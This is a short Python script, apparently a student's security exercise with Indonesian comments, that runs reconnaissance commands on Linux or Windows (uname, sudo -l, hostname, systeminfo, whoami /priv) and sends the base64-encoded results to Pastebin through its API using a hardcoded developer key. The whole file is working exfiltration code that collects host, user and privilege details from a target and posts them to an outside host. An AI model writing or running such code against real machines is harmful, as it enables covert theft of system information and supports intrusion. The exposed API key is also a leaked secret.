# James Yogansha
# 2301926371

import requests
import subprocess
import os
import base64

def upload(msg):
    # IP/link tujuan untuk mengirim informasi
    website = "https://pastebin.com/api/api_post.php"
    api = {
        'api_dev_key' : "nTUs3tSFOMvhWageA1tqwqdR7OsK7YHO",
        'api_paste_code' : msg,
        'api_paste_name' : 'Target',
        'api_option' : 'paste'
    }

    try:
        send = requests.post(website, data=api)
    except Exception as e:
        print(e)
        
def linux():
    # Melakukan host recon cmd untuk linux (hostname, user, privilege)
    run = ["uname -a", "sudo -l", "hostname"]
    data = []

    for p in run:
        temp = subprocess.Popen(args=p, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

        str, strerr = temp.communicate()
        if strerr != b'':
            data.append(p)
            data.append(strerr.decode())
        else:
            data.append(str.decode())
    
    data = "\n".join(data)
    upload(base64.b64encode(data.encode()))

def windows():
    # Melakukan host recon cmd untuk windows (hostname, user, privilege)
    run = ["systeminfo", "whoami", "whoami /priv"]
    data = []

    for p in run:
        temp = subprocess.Popen(args=p, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

        str, strerr = temp.communicate()
        if strerr != b'':
            data.append(p)
            data.append(strerr.decode())
        else:
            data.append(str.decode())
    
    data = "\n".join(data)
    upload(base64.b64encode(data.encode()))

def main():
    # Melakukan pengecekkan OS
    if os.name == "nt":
        windows()
    else:
        linux()